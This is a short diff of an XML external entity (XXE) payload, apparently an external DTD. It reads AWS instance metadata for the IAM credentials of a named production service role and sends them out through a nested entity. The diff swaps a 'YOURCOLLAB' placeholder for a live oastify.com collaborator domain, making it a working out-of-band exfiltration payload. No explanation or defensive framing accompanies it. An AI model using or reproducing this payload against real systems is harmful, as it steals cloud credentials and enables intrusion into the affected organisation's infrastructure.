@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/epps-prod-ratesheets-iam-servicerole-us-west-2">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOURCOLLAB/?xxe=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://kvj9kqvvozvb8aw97jdycu12bthk5atz.oastify.com/?xxe=%file;'>">
 %eval;
 %exfiltrate;
